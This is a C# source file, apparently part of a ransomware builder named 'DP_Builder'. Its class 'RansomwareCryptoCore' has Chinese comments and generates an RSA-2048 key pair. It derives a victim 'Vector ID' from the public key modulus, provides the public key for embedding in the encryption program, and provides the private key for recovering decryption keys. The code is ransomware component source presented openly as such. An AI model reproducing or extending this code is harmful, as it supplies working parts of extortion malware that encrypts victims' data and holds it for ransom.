using System.Security.Cryptography;
using System.Text.RegularExpressions;

namespace DP_Builder
{
    public static class RansomwareCryptoCore
    {
        private static string RSA_Public = "";
        private static string RSA_Private = "";

        /// <summary>
        /// 生成 RSA 密钥对（2048 位）
        /// </summary>
        public static void GenerateRSAKeys()
        {
            using (var rsa = new RSACryptoServiceProvider(2048))
            {
                RSA_Private = rsa.ToXmlString(true);   // 私钥（包含 d）
                RSA_Public = rsa.ToXmlString(false);   // 公钥（仅 n, e）
            }
        }

        /// <summary>
        /// 从 RSA 公钥提取前 8 位 Modulus 作为 Vector ID（模拟原始逻辑）
        /// </summary>
        public static string GetVectorFromPublicKey()
        {
            var match = Regex.Match(RSA_Public, @"<Modulus>(.*)</Modulus>", RegexOptions.IgnoreCase);
            if (match.Success)
            {
                return match.Groups[1].Value.Substring(0, 8)
                    .Replace("\\", "0").Replace("/", "0").Replace("+", "0");
            }
            return "00000000";
        }

        /// <summary>
        /// 获取 RSA 公钥 XML（用于嵌入加密程序）
        /// </summary>
        public static string GetPublicKey() => RSA_Public;

        /// <summary>
        /// 获取 RSA 私钥 XML（用于解密密钥恢复）
        /// </summary>
        public static string GetPrivateKey() => RSA_Private;
    }
}